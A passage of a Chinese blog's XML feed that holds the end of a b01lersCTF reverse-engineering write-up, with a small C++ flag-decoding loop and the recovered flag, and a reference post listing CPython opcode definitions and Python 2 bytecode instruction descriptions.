0x40, 0x27, 0x4A, 0xC4, 0x97, 0xC0, 0x72, 0x18, 0x42, 0x96, 0xF7, 0xC5, 0x71, 0x3D,                   0xE4, 0x90, 0xA7, 0x5A, 0x0C, 0xA8, 0x8C, 0x6F, 0x74, 0xF1, 0xCA, 0xA4, 0x0A, 0x17, 0x8A, 0xA5, 0x54,                   0xEE, 0x9B, 0x3B, 0x69, 0xA3, 0xEF, 0x54};    while (a5 &lt; 75) {        v11 = (unsigned __int8) v8 + a5++;        v8 = (unsigned int) v11 +             (unsigned int) ((unsigned __int64) (0x8080808080808081LL * (unsigned __int128) v11 &gt;&gt; 64) &gt;&gt; 7);        v8s[a5] = v8;    }    string flag;    for (int i = 0; i &lt; 75; i++) {        char tmp = target[i] ^v8s[i];        flag += tmp;    }    cout &lt;&lt; flag &lt;&lt; endl;    return 0;}</code></pre><p>输出的flag为</p><pre><code>pctf{th3_m0d3rn_st34m_3ng1n3_w45_1nv3nt3d_1n_1698_buT_th3_b3st_0n3_in_1940}</code></pre>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>writeup</tag>
      
      <tag>b01lersCTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python_opcode</title>
    <link href="/2020/03/13/python-opcode/"/>
    <url>/2020/03/13/python-opcode/</url>
    
    <content type="html"><![CDATA[<p>把python的opcode在这里记录，便于查表</p><a id="more"></a><h4 id="Opcode"><a href="#Opcode" class="headerlink" title="Opcode"></a>Opcode</h4><pre><code class="c++">/* Auto-generated by Tools/scripts/generate_opcode_h.py from Lib/opcode.py */#ifndef Py_OPCODE_H#define Py_OPCODE_H#ifdef __cplusplusextern &quot;C&quot; {#endif    /* Instruction opcodes for compiled code */#define POP_TOP                   1#define ROT_TWO                   2#define ROT_THREE                 3#define DUP_TOP                   4#define DUP_TOP_TWO               5#define ROT_FOUR                  6#define NOP                       9#define UNARY_POSITIVE           10#define UNARY_NEGATIVE           11#define UNARY_NOT                12#define UNARY_INVERT             15#define BINARY_MATRIX_MULTIPLY   16#define INPLACE_MATRIX_MULTIPLY  17#define BINARY_POWER             19#define BINARY_MULTIPLY          20#define BINARY_MODULO            22#define BINARY_ADD               23#define BINARY_SUBTRACT          24#define BINARY_SUBSCR            25#define BINARY_FLOOR_DIVIDE      26#define BINARY_TRUE_DIVIDE       27#define INPLACE_FLOOR_DIVIDE     28#define INPLACE_TRUE_DIVIDE      29#define RERAISE                  48#define WITH_EXCEPT_START        49#define GET_AITER                50#define GET_ANEXT                51#define BEFORE_ASYNC_WITH        52#define END_ASYNC_FOR            54#define INPLACE_ADD              55#define INPLACE_SUBTRACT         56#define INPLACE_MULTIPLY         57#define INPLACE_MODULO           59#define STORE_SUBSCR             60#define DELETE_SUBSCR            61#define BINARY_LSHIFT            62#define BINARY_RSHIFT            63#define BINARY_AND               64#define BINARY_XOR               65#define BINARY_OR                66#define INPLACE_POWER            67#define GET_ITER                 68#define GET_YIELD_FROM_ITER      69#define PRINT_EXPR               70#define LOAD_BUILD_CLASS         71#define YIELD_FROM               72#define GET_AWAITABLE            73#define LOAD_ASSERTION_ERROR     74#define INPLACE_LSHIFT           75#define INPLACE_RSHIFT           76#define INPLACE_AND              77#define INPLACE_XOR              78#define INPLACE_OR               79#define LIST_TO_TUPLE            82#define RETURN_VALUE             83#define IMPORT_STAR              84#define SETUP_ANNOTATIONS        85#define YIELD_VALUE              86#define POP_BLOCK                87#define POP_EXCEPT               89#define HAVE_ARGUMENT            90#define STORE_NAME               90#define DELETE_NAME              91#define UNPACK_SEQUENCE          92#define FOR_ITER                 93#define UNPACK_EX                94#define STORE_ATTR               95#define DELETE_ATTR              96#define STORE_GLOBAL             97#define DELETE_GLOBAL            98#define LOAD_CONST              100#define LOAD_NAME               101#define BUILD_TUPLE             102#define BUILD_LIST              103#define BUILD_SET               104#define BUILD_MAP               105#define LOAD_ATTR               106#define COMPARE_OP              107#define IMPORT_NAME             108#define IMPORT_FROM             109#define JUMP_FORWARD            110#define JUMP_IF_FALSE_OR_POP    111#define JUMP_IF_TRUE_OR_POP     112#define JUMP_ABSOLUTE           113#define POP_JUMP_IF_FALSE       114#define POP_JUMP_IF_TRUE        115#define LOAD_GLOBAL             116#define IS_OP                   117#define CONTAINS_OP             118#define JUMP_IF_NOT_EXC_MATCH   121#define SETUP_FINALLY           122#define LOAD_FAST               124#define STORE_FAST              125#define DELETE_FAST             126#define RAISE_VARARGS           130#define CALL_FUNCTION           131#define MAKE_FUNCTION           132#define BUILD_SLICE             133#define LOAD_CLOSURE            135#define LOAD_DEREF              136#define STORE_DEREF             137#define DELETE_DEREF            138#define CALL_FUNCTION_KW        141#define CALL_FUNCTION_EX        142#define SETUP_WITH              143#define EXTENDED_ARG            144#define LIST_APPEND             145#define SET_ADD                 146#define MAP_ADD                 147#define LOAD_CLASSDEREF         148#define SETUP_ASYNC_WITH        154#define FORMAT_VALUE            155#define BUILD_CONST_KEY_MAP     156#define BUILD_STRING            157#define LOAD_METHOD             160#define CALL_METHOD             161#define LIST_EXTEND             162#define SET_UPDATE              163#define DICT_MERGE              164#define DICT_UPDATE             165/* EXCEPT_HANDLER is a special, implicit block type which is created when   entering an except handler. It is not an opcode but we define it here   as we want it to be available to both frameobject.c and ceval.c, while   remaining private.*/#define EXCEPT_HANDLER 257#define HAS_ARG(op) ((op) &gt;= HAVE_ARGUMENT)#ifdef __cplusplus}#endif#endif /* !Py_OPCODE_H */</code></pre><p>对应指令的含义如下：</p><h4 id="Bytecode-Instructions"><a href="#Bytecode-Instructions" class="headerlink" title="Bytecode Instructions"></a>Bytecode Instructions</h4><p>The Python compiler currently generates the following bytecode instructions.</p><ul><li><p><code>STOP_CODE</code>()</p><p>Indicates end-of-code to the compiler, not used by the interpreter.</p></li><li><p><code>NOP</code>()</p><p>Do nothing code. Used as a placeholder by the bytecode optimizer.</p></li><li><p><code>POP_TOP</code>()</p><p>Removes the top-of-stack (TOS) item.</p></li><li><p><code>ROT_TWO</code>()</p><p>Swaps the two top-most stack items.</p></li><li><p><code>ROT_THREE</code>()</p><p>Lifts second and third stack item one position up, moves top down to position three.</p></li><li><p><code>ROT_FOUR</code>()</p><p>Lifts second, third and forth stack item one position up, moves top down to position four.</p></li><li><p><code>DUP_TOP</code>()</p><p>Duplicates the reference on top of the stack.</p></li></ul><p>Unary Operations take the top of the stack, apply the operation, and push the result back on the stack.</p><ul><li><p><code>UNARY_POSITIVE</code>()</p><p>Implements <code>TOS = +TOS</code>.</p></li><li><p><code>UNARY_NEGATIVE</code>()</p><p>Implements <code>TOS = -TOS</code>.</p></li><li><p><code>UNARY_NOT</code>()</p><p>Implements <code>TOS = not TOS</code>.</p></li><li><p><code>UNARY_CONVERT</code>()</p><p>Implements <code>TOS =</code>TOS``.</p></li><li><p><code>UNARY_INVERT</code>()</p><p>Implements <code>TOS = ~TOS</code>.</p></li><li><p><code>GET_ITER</code>()</p><p>Implements <code>TOS = iter(TOS)</code>.</p></li></ul><p>Binary operations remove the top of the stack (TOS) and the second top-most stack item (TOS1) from the stack. They perform the operation, and put the result back on the stack.</p><ul><li><p><code>BINARY_POWER</code>()</p><p>Implements <code>TOS = TOS1 ** TOS</code>.</p></li><li><p><code>BINARY_MULTIPLY</code>()</p><p>Implements <code>TOS = TOS1 * TOS</code>.</p></li><li><p><code>BINARY_DIVIDE</code>()</p><p>Implements <code>TOS = TOS1 / TOS</code> when <code>from __future__ import division</code> is not in effect.</p></li><li><p><code>BINARY_FLOOR_DIVIDE</code>()</p><p>Implements <code>TOS = TOS1 // TOS</code>.</p></li><li><p><code>BINARY_TRUE_DIVIDE</code>()</p><p>Implements <code>TOS = TOS1 / TOS</code> when <code>from __future__ import division</code> is in effect.</p></li><li><p><code>BINARY_MODULO</code>()</p><p>Implements <code>TOS = TOS1 % TOS</code>.</p></li><li><p><code>BINARY_ADD</code>()</p><p>Implements <code>TOS = TOS1 + TOS</code>.</p></li><li><p><code>BINARY_SUBTRACT</code>()</p><p>Implements <code>TOS = TOS1 - TOS</code>.</p></li><li><p><code>BINARY_SUBSCR</code>()</p><p>Implements <code>TOS = TOS1[TOS]</code>.</p></li><li><p><code>BINARY_LSHIFT</code>()</p><p>Implements <code>TOS = TOS1 &lt;&lt; TOS</code>.</p></li><li><p><code>BINARY_RSHIFT</code>()</p><p>Implements <code>TOS = TOS1 &gt;&gt; TOS</code>.</p></li><li><p><code>BINARY_AND</code>()</p><p>Implements <code>TOS = TOS1 &amp; TOS</code>.</p></li><li><p><code>BINARY_XOR</code>()</p><p>Implements <code>TOS = TOS1 ^ TOS</code>.</p></li><li><p><code>BINARY_OR</code>()</p><p>Implements <code>TOS = TOS1 | TOS</code>.</p></li></ul><p>In-place operations are like binary operations, in that they remove TOS and TOS1, and push the result back on the stack, but the operation is done in-place when TOS1 supports it, and the resulting TOS may be (but does not have to be) the original TOS1.</p><ul><li><p><code>INPLACE_POWER</code>()</p><p>Implements in-place <code>TOS = TOS1 ** TOS</code>.</p></li><li><p><code>INPLACE_MULTIPLY</code>()</p><p>Implements in-place <code>TOS = TOS1 * TOS</code>.</p></li><li><p><code>INPLACE_DIVIDE</code>()</p><p>Implements in-place <code>TOS = TOS1 / TOS</code> when <code>from __future__ import division</code> is not in effect.</p></li><li><p><code>INPLACE_FLOOR_DIVIDE</code>()</p><p>Implements in-place <code>TOS = TOS1 // TOS</code>.</p></li><li><p><code>INPLACE_TRUE_DIVIDE</code>()</p><p>Implements in-place <code>TOS = TOS1 / TOS</code> when <code>from __future__ import division</code> is in effect.</p></li><li><p><code>INPLACE_MODULO</code>()</p><p>Implements in-place <code>TOS = TOS1 % TOS</code>.</p></li><li><p><code>INPLACE_ADD</code>()</p><p>Implements in-place <code>TOS = TOS1 + TOS</code>.</p></li><li><p><code>INPLACE_SUBTRACT</code>()</p><p>Implements in-place <code>TOS = TOS1 - TOS</code>.</p></li><li><p><code>INPLACE_LSHIFT</code>()</p><p>Implements in-place <code>TOS = TOS1 &lt;&lt; TOS</code>.</p></li><li><p><code>INPLACE_RSHIFT</code>()</p><p>Implements in-place <code>TOS = TOS1 &gt;&gt; TOS</code>.</p></li><li><p><code>INPLACE_AND</code>()</p><p>Implements in-place <code>TOS = TOS1 &amp; TOS</code>.</p></li><li><p><code>INPLACE_XOR</code>()</p><p>Implements in-place <code>TOS = TOS1 ^ TOS</code>.</p></li><li><p><code>INPLACE_OR</code>()</p><p>Implements in-place <code>TOS = TOS1 | TOS</code>.</p></li></ul><p>The slice opcodes take up to three parameters.</p><ul><li><p><code>SLICE+0</code>()</p><p>Implements <code>TOS = TOS[:]</code>.</p></li><li><p><code>SLICE+1</code>()</p><p>Implements <code>TOS = TOS1[TOS:]</code>.</p></li><li><p><code>SLICE+2</code>()</p><p>Implements <code>TOS = TOS1[:TOS]</code>.</p></li><li><p><code>SLICE+3</code>()</p><p>Implements <code>TOS = TOS2[TOS1:TOS]</code>.</p></li></ul><p>Slice assignment needs even an additional parameter. As any statement, they put nothing on the stack.</p><ul><li><p><code>STORE_SLICE+0</code>()</p><p>Implements <code>TOS[:] = TOS1</code>.</p></li><li><p><code>STORE_SLICE+1</code>()</p><p>Implements <code>TOS1[TOS:] = TOS2</code>.</p></li><li><p><code>STORE_SLICE+2</code>()</p><p>Implements <code>TOS1[:TOS] = TOS2</code>.</p></li><li><p><code>STORE_SLICE+3</code>()</p><p>Implements <code>TOS2[TOS1:TOS] = TOS3</code>.</p></li><li><p><code>DELETE_SLICE+0</code>()</p><p>Implements <code>del TOS[:]</code>.</p></li><li><p><code>DELETE_SLICE+1</code>()</p><p>Implements <code>del TOS1[TOS:]</code>.</p></li><li><p><code>DELETE_SLICE+2</code>()</p><p>Implements <code>del TOS1[:TOS]</code>.</p></li><li><p><code>DELETE_SLICE+3</code>()</p><p>Implements <code>del TOS2[TOS1:TOS]</code>.</p></li><li><p><code>STORE_SUBSCR</code>()</p><p>Implements <code>TOS1[TOS] = TOS2</code>.</p></li><li><p><code>DELETE_SUBSCR</code>()</p><p>Implements <code>del TOS1[TOS]</code>.</p></li></ul><p>Miscellaneous opcodes.</p><ul><li><p><code>PRINT_EXPR</code>()</p><p>Implements the expression statement for the interactive mode. TOS is removed from the stack and printed. In non-interactive mode, an expression statement is terminated with <a href="https://docs.python.org/2/library/dis.html#opcode-POP_TOP" target="_blank" rel="noopener"><code>POP_TOP</code></a>.</p></li><li><p><code>PRINT_ITEM</code>()</p><p>Prints TOS to the file-like object bound to <code>sys.stdout</code>. There is one such instruction for each item in the <a href="https://docs.python.org/2/reference/simple_stmts.html#print" target="_blank" rel="noopener"><code>print</code></a> statement.</p></li><li><p><code>PRINT_ITEM_TO</code>()</p><p>Like <code>PRINT_ITEM</code>, but prints the item second from TOS to the file-like object at TOS. This is used by the extended print statement.</p></li><li><p><code>PRINT_NEWLINE</code>()</p><p>Prints a new line on <code>sys.stdout</code>. This is generated as the last operation of a <a href="https://docs.python.org/2/reference/simple_stmts.html#print" target="_blank" rel="noopener"><code>print</code></a> statement, unless the statement ends with a comma.</p></li><li><p><code>PRINT_NEWLINE_TO</code>()</p><p>Like <code>PRINT_NEWLINE</code>, but prints the new line on the file-like object on the TOS. This is used by the extended print statement.</p></li><li><p><code>BREAK_LOOP</code>()</p><p>Terminates a loop due to a <a href="https://docs.python.org/2/reference/simple_stmts.html#break" target="_blank" rel="noopener"><code>break</code></a> statement.</p></li><li><p><code>CONTINUE_LOOP</code>(<em>target</em>)</p><p>Continues a loop due to a <a href="https://docs.python.org/2/reference/simple_stmts.html#continue" target="_blank" rel="noopener"><code>continue</code></a> statement. <em>target</em> is the address to jump to (which should be a <a href="https://docs.python.org/2/library/dis.html#opcode-FOR_ITER" target="_blank" rel="noopener"><code>FOR_ITER</code></a> instruction).</p></li><li><p><code>LIST_APPEND</code>(<em>i</em>)</p><p>Calls <code>list.append(TOS[-i], TOS)</code>. Used to implement list comprehensions. While the appended value is popped off, the list object remains on the stack so that it is available for further iterations of the loop.</p></li><li><p><code>LOAD_LOCALS</code>()</p><p>Pushes a reference to the locals of the current scope on the stack. This is used in the code for a class definition: After the class body is evaluated, the locals are passed to the class definition.</p></li><li><p><code>RETURN_VALUE</code>()</p><p>Returns with TOS to the caller of the function.</p></li><li><p><code>YIELD_VALUE</code>()</p><p>Pops <code>TOS</code> and yields it from a <a href="https://docs.python.org/2/glossary.html#term-generator" target="_blank" rel="noopener">generator</a>.</p></li><li><p><code>IMPORT_STAR</code>()</p><p>Loads all symbols not starting with <code>&#39;_&#39;</code> directly from the module TOS to the local namespace. The module is popped after loading all names. This opcode implements <code>from module import *</code>.</p></li><li><p><code>EXEC_STMT</code>()</p><p>Implements <code>exec TOS2,TOS1,TOS</code>. The compiler fills missing optional parameters with <code>None</code>.</p></li><li><p><code>POP_BLOCK</code>()</p><p>Removes one block from the block stack. Per frame, there is a stack of blocks, denoting nested loops, try statements, and such.</p></li><li><p><code>END_FINALLY</code>()</p><p>Terminates a <a href="https://docs.python.org/2/reference/compound_stmts.html#finally" target="_blank" rel="noopener"><code>finally</code></a> clause. The interpreter recalls whether the exception has to be re-raised, or whether the function returns, and continues with the outer-next block.</p></li><li><p><code>BUILD_CLASS</code>()</p><p>Creates a new class object. TOS is the methods dictionary, TOS1 the tuple of the names of the base classes, and TOS2 the class name.</p></li><li><p><code>SETUP_WITH</code>(<em>delta</em>)</p><p>This opcode performs several operations before a with block starts. First, it loads <a href="https://docs.python.org/2/reference/datamodel.html#object.__exit__" target="_blank" rel="noopener"><code>__exit__()</code></a> from the context manager and pushes it onto the stack for later use by <a href="https://docs.python.org/2/library/dis.html#opcode-WITH_CLEANUP" target="_blank" rel="noopener"><code>WITH_CLEANUP</code></a>. Then, <a href="https://docs.python.org/2/reference/datamodel.html#object.__enter__" target="_blank" rel="noopener"><code>__enter__()</code></a> is called, and a finally block pointing to <em>delta</em> is pushed. Finally, the result of calling the enter method is pushed onto the stack. The next opcode will either ignore it (<a href="https://docs.python.org/2/library/dis.html#opcode-POP_TOP" target="_blank" rel="noopener"><code>POP_TOP</code></a>), or store it in (a) variable(s) (<a href="https://docs.python.org/2/library/dis.html#opcode-STORE_FAST" target="_blank" rel="noopener"><code>STORE_FAST</code></a>, <a href="https://docs.python.org/2/library/dis.html#opcode-STORE_NAME" target="_blank" rel="noopener"><code>STORE_NAME</code></a>, or <a href="https://docs.python.org/2/library/dis.html#opcode-UNPACK_SEQUENCE" target="_blank" rel="noopener"><code>UNPACK_SEQUENCE</code></a>).</p></li><li><p><code>WITH_CLEANUP</code>()</p><p>Cleans up the stack when a <a href="https://docs.python.org/2/reference/compound_stmts.html#with" target="_blank" rel="noopener"><code>with</code></a> statement block exits. On top of the stack are 1–3 values indicating how/why the finally clause was entered:TOP = <code>None</code>(TOP, SECOND) = (<code>WHY_{RETURN,CONTINUE}</code>), retvalTOP = <code>WHY_*</code>; no retval below it(TOP, SECOND, THIRD) = exc_info()Under them is EXIT, the context manager’s <a href="https://docs.python.org/2/reference/datamodel.html#object.__exit__" target="_blank" rel="noopener"><code>__exit__()</code></a> bound method.In the last case, <code>EXIT(TOP, SECOND, THIRD)</code> is called, otherwise <code>EXIT(None, None, None)</code>.EXIT is removed from the stack, leaving the values above it in the same order. In addition, if the stack represents an exception, <em>and</em> the function call returns a ‘true’ value, this information is “zapped”, to prevent <code>END_FINALLY</code> from re-raising the exception. (But non-local gotos should still be resumed.)</p></li></ul><p>All of the following opcodes expect arguments. An argument is two bytes, with the more significant byte last.</p><ul><li><p><code>STORE_NAME</code>(<em>namei</em>)</p><p>Implements <code>name = TOS</code>. <em>namei</em> is the index of <em>name</em> in the attribute <code>co_names</code> of the code object. The compiler tries to use <code>STORE_FAST</code> or <code>STORE_GLOBAL</code> if possible.</p></li><li><p><code>DELETE_NAME</code>(<em>namei</em>)</p><p>Implements <code>del name</code>, where <em>namei</em> is the index into <code>co_names</code> attribute of the code object.</p></li><li><p><code>UNPACK_SEQUENCE</code>(<em>count</em>)</p><p>Unpacks TOS into <em>count</em> individual values, which are put onto the stack right-to-left.</p></li><li><p><code>DUP_TOPX</code>(<em>count</em>)</p><p>Duplicate <em>count</em> items, keeping them in the same order. Due to implementation limits, <em>count</em> should be between 1 and 5 inclusive.</p></li><li><p><code>STORE_ATTR</code>(<em>namei</em>)</p><p>Implements <code>TOS.name = TOS1</code>, where <em>namei</em> is the index of name in <code>co_names</code>.</p></li><li><p><code>DELETE_ATTR</code>(<em>namei</em>)</p><p>Implements <code>del TOS.name</code>, using <em>namei</em> as index into <code>co_names</code>.</p></li><li><p><code>STORE_GLOBAL</code>(<em>namei</em>)</p><p>Works as <code>STORE_NAME</code>, but stores the name as a global.</p></li><li><p><code>DELETE_GLOBAL</code>(<em>namei</em>)</p><p>Works as <code>DELETE_NAME</code>, but deletes a global name.</p></li><li><p><code>LOAD_CONST</code>(<em>consti</em>)</p><p>Pushes <code>co_consts[consti]</code> onto the stack.</p></li><li><p><code>LOAD_NAME</code>(<em>namei</em>)</p><p>Pushes the value associated with <code>co_names[namei]</code> onto the stack.</p></li><li><p><code>BUILD_TUPLE</code>(<em>count</em>)</p><p>Creates a tuple consuming <em>count</em> items from the stack, and pushes the resulting tuple onto the stack.</p></li><li><p><code>BUILD_LIST</code>(<em>count</em>)</p><p>Works as <code>BUILD_TUPLE</code>, but creates a list.</p></li><li><p><code>BUILD_SET</code>(<em>count</em>)</p><p>Works as <code>BUILD_TUPLE</code>, but creates a set.<em>New in version 2.7.</em></p></li><li><p><code>BUILD_MAP</code>(<em>count</em>)</p><p>Pushes a new dictionary object onto the stack. The dictionary is pre-sized to hold <em>count</em> entries.</p></li><li><p><code>LOAD_ATTR</code>(<em>namei</em>)</p><p>Replaces TOS with <code>getattr(TOS, co_names[namei])</code>.</p></li><li><p><code>COMPARE_OP</code>(<em>opname</em>)</p><p>Performs a Boolean operation. The operation name can be found in <code>cmp_op[opname]</code>.</p></li><li><p><code>IMPORT_NAME</code>(<em>namei</em>)</p><p>Imports the module <code>co_names[namei]</code>. TOS and TOS1 are popped and provide the <em>fromlist</em> and <em>level</em> arguments of <a href="https://docs.python.org/2/library/functions.html#__import__" target="_blank" rel="noopener"><code>__import__()</code></a>. The module object is pushed onto the stack. The current namespace is not affected: for a proper import statement, a subsequent <code>STORE_FAST</code> instruction modifies the namespace.</p></li><li><p><code>IMPORT_FROM</code>(<em>namei</em>)</p><p>Loads the attribute <code>co_names[namei]</code> from the module found in TOS. The resulting object is pushed onto the stack, to be subsequently stored by a <code>STORE_FAST</code> instruction.</p></li><li><p><code>JUMP_FORWARD</code>(<em>delta</em>)</p><p>Increments bytecode counter by <em>delta</em>.</p></li><li><p><code>POP_JUMP_IF_TRUE</code>(<em>target</em>)</p><p>If TOS is true, sets the bytecode counter to <em>target</em>. TOS is popped.</p></li><li><p><code>POP_JUMP_IF_FALSE</code>(<em>target</em>)</p><p>If TOS is false, sets the bytecode counter to <em>target</em>. TOS is popped.</p></li><li><p><code>JUMP_IF_TRUE_OR_POP</code>(<em>target</em>)</p><p>If TOS is true, sets the bytecode counter to <em>target</em> and leaves TOS on the stack. Otherwise (TOS is false), TOS is popped.</p></li><li><p><code>JUMP_IF_FALSE_OR_POP</code>(<em>target</em>)</p><p>If TOS is false, sets the bytecode counter to <em>target</em> and leaves TOS on the stack. Otherwise (TOS is true), TOS is popped.</p></li><li><p><code>JUMP_ABSOLUTE</code>(<em>target</em>)</p><p>Set bytecode counter to <em>target</em>.</p></li><li><p><code>FOR_ITER</code>(<em>delta</em>)</p><p><code>TOS</code> is an <a href="https://docs.python.org/2/glossary.html#term-iterator" target="_blank" rel="noopener">iterator</a>. Call its <code>next()</code> method. If this yields a new value, push it on the stack (leaving the iterator below it). If the iterator indicates it is exhausted <code>TOS</code> is popped, and the bytecode counter is incremented by <em>delta</em>.</p></li><li><p><code>LOAD_GLOBAL</code>(<em>namei</em>)</p><p>Loads the global named <code>co_names[namei]</code> onto the stack.</p></li><li><p><code>SETUP_LOOP</code>(<em>delta</em>)</p><p>Pushes a block for a loop onto the block stack. The block spans from the current instruction with a size of <em>delta</em> bytes.</p></li><li><p><code>SETUP_EXCEPT</code>(<em>delta</em>)</p><p>Pushes a try block from a try-except clause onto the block stack. <em>delta</em> points to the first except block.</p></li><li><p><code>SETUP_FINALLY</code>(<em>delta</em>)</p><p>Pushes a try block from a try-except clause onto the block stack. <em>delta</em> points to the finally block.</p></li><li><p><code>STORE_MAP</code>()</p><p>Store a key and value pair in a dictionary. Pops the key and value while leaving the dictionary on the stack.</p></li><li><p><code>LOAD_FAST</code>(<em>var_num</em>)</p><p>Pushes a reference to the local <code>co_varnames[var_num]</code> onto the stack.</p></li><li><p><code>STORE_FAST</code>(<em>var_num</em>)</p><p>Stores TOS into the local <code>co_varnames[var_num]</code>.</p></li><li><p><code>DELETE_FAST</code>(<em>var_num</em>)</p><p>Deletes local <code>co_varnames[var_num]</code>.</p></li><li><p><code>LOAD_CLOSURE</code>(<em>i</em>)</p><p>Pushes a reference to the cell contained in slot <em>i</em> of the cell and free variable storage. The name of the variable is <code>co_cellvars[i]</code> if <em>i</em> is less than the length of <em>co_cellvars</em>. Otherwise it is <code>co_freevars[i - len(co_cellvars)]</code>.</p></li><li><p><code>LOAD_DEREF</code>(<em>i</em>)</p><p>Loads the cell contained in slot <em>i</em> of the cell and free variable storage. Pushes a reference to the object the cell contains on the stack.</p></li><li><p><code>STORE_DEREF</code>(<em>i</em>)</p><p>Stores TOS into the cell contained in slot <em>i</em> of the cell and free variable storage.</p></li><li><p><code>SET_LINENO</code>(<em>lineno</em>)</p><p>This opcode is obsolete.</p></li><li><p><code>RAISE_VARARGS</code>(<em>argc</em>)</p><p>Raises an exception. <em>argc</em> indicates the number of arguments to the raise statement, ranging from 0 to 3. The handler will find the traceback as TOS2, the parameter as TOS1, and the exception as TOS.</p></li><li><p><code>CALL_FUNCTION</code>(<em>argc</em>)</p><p>Calls a callable object. The low byte of <em>argc</em> indicates the number of positional arguments, the high byte the number of keyword arguments. The stack contains keyword arguments on top (if any), then the positional arguments below that (if any), then the callable object to call below that. Each keyword argument is represented with two values on the stack: the argument’s name, and its value, with the argument’s value above the name on the stack. The positional arguments are pushed in the order that they are passed in to the callable object, with the right-most positional argument on top. <code>CALL_FUNCTION</code> pops all arguments and the callable object off the stack, calls the callable object with those arguments, and pushes the return value returned by the callable object.</p></li><li><p><code>MAKE_FUNCTION</code>(<em>argc</em>)</p><p>Pushes a new function object on the stack. TOS is the code associated with the function. The function object is defined to have <em>argc</em> default parameters, which are found below TOS.</p></li><li><p><code>MAKE_CLOSURE</code>(<em>argc</em>)</p><p>Creates a new function object, sets its <em>func_closure</em> slot, and pushes it on the stack. TOS is the code associated with the function, TOS1 the tuple containing cells for the closure’s free variables. The function also has <em>argc</em> default parameters, which are found below the cells.</p></li><li><p><code>BUILD_SLICE</code>(<em>argc</em>)</p><p>Pushes a slice object on the stack. <em>argc</em> must be 2 or 3. If it is 2, <code>slice(TOS1, TOS)</code> is pushed; if it is 3, <code>slice(TOS2, TOS1, TOS)</code> is pushed. See the <a href="https://docs.python.org/2/library/functions.html#slice" target="_blank" rel="noopener"><code>slice()</code></a> built-in function for more information.</p></li><li><p><code>EXTENDED_ARG</code>(<em>ext</em>)</p><p>Prefixes any opcode which has an argument too big to fit into the default two bytes. <em>ext</em> holds two additional bytes which, taken together with the subsequent opcode’s argument, comprise a four-byte argument, <em>ext</em> being the two most-significant bytes.</p></li><li><p><code>CALL_FUNCTION_VAR</code>(<em>argc</em>)</p><p>Calls a callable object, similarly to <a href="https://docs.python.org/2/library/dis.html#opcode-CALL_FUNCTION" target="_blank" rel="noopener"><code>CALL_FUNCTION</code></a>. <em>argc</em> represents the number of keyword and positional arguments, identically to <a href="https://docs.python.org/2/library/dis.html#opcode-CALL_FUNCTION" target="_blank" rel="noopener"><code>CALL_FUNCTION</code></a>. The top of the stack contains an iterable object containing additional positional arguments. Below that are keyword arguments (if any), positional arguments (if any) and a callable object, identically to <a href="https://docs.python.org/2/library/dis.html#opcode-CALL_FUNCTION" target="_blank" rel="noopener"><code>CALL_FUNCTION</code></a>. Before the callable object is called, the iterable object is “unpacked” and its contents are appended to the positional arguments passed in. The iterable object is ignored when computing the value of <code>argc</code>.</p></li><li><p><code>CALL_FUNCTION_KW</code>(<em>argc</em>)</p><p>Calls a callable object, similarly to <a href="https://docs.python.org/2/library/dis.html#opcode-CALL_FUNCTION" target="_blank" rel="noopener"><code>CALL_FUNCTION</code></a>. <em>argc</em> represents the number of keyword and positional arguments, identically to <a href="https://docs.python.org/2/library/dis.html#opcode-CALL_FUNCTION" target="_blank" rel="noopener"><code>CALL_FUNCTION</code></a>. The top of the stack contains a mapping object containing additional keyword arguments. Below that are keyword arguments (if any), positional arguments (if any) and a callable object, identically to <a href="https://docs.python.org/2/library/dis.html#opcode-CALL_FUNCTION" target="_blank" rel="noopener"><code>CALL_FUNCTION</code></a>. Before the callable is called, the mapping object at the top of the stack is “unpacked” and its contents are appended to the keyword arguments passed in. The mapping object at the top of the stack is ignored when computing the value of <code>argc</code>.</p></li><li><p><code>CALL_FUNCTION_VAR_KW</code>(<em>argc</em>)</p><p>Calls a callable object, similarly to <a href="https://docs.python.org/2/library/dis.html#opcode-CALL_FUNCTION_VAR" target="_blank" rel="noopener"><code>CALL_FUNCTION_VAR</code></a> and <a href="https://docs.python.org/2/library/dis.html#opcode-CALL_FUNCTION_KW" target="_blank" rel="noopener"><code>CALL_FUNCTION_KW</code></a>. <em>argc</em> represents the number of keyword and positional arguments, identically to <a href="https://docs.python.org/2/library/dis.html#opcode-CALL_FUNCTION" target="_blank" rel="noopener"><code>CALL_FUNCTION</code></a>. The top of the stack contains a mapping object, as per <a href="https://docs.python.org/2/library/dis.html#opcode-CALL_FUNCTION_KW" target="_blank" rel="noopener"><code>CALL_FUNCTION_KW</code></a>. Below that is an iterable object, as per <a href="https://docs.python.org/2/library/dis.html#opcode-CALL_FUNCTION_VAR" target="_blank" rel="noopener"><code>CALL_FUNCTION_VAR</code></a>. Below that are keyword arguments (if any), positional arguments (if any) and a callable object, identically to <a href="https://docs.python.org/2/library/dis.html#opcode-CALL_FUNCTION" target="_blank" rel="noopener"><code>CALL_FUNCTION</code></a>. Before the callable is called, the mapping object and iterable object are each “unpacked” and their contents passed in as keyword and positional arguments respectively, identically to <a href="https://docs.python.org/2/library/dis.html#opcode-CALL_FUNCTION_VAR" target="_blank" rel="noopener"><code>CALL_FUNCTION_VAR</code></a> and <a href="https://docs.python.org/2/library/dis.html#opcode-CALL_FUNCTION_KW" target="_blank" rel="noopener"><code>CALL_FUNCTION_KW</code></a>. The mapping object and iterable object are both ignored when computing the value of <code>argc</code>.</p></li><li><p><code>HAVE_ARGUMENT</code>()</p><p>This is not really an opcode. It identifies the dividing line between opcodes which don’t take arguments <code>&lt; HAVE_ARGUMENT</code> and those which do <code>&gt;= HAVE_ARGUMENT</code>.</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>查表</tag>
      
      <tag>python</tag>
      
      <tag>opcode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界-re部分题解（五）</title>
    <link href="/2020/03/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3%EF%BC%88%E4%BA%94%EF%BC%89/"/>
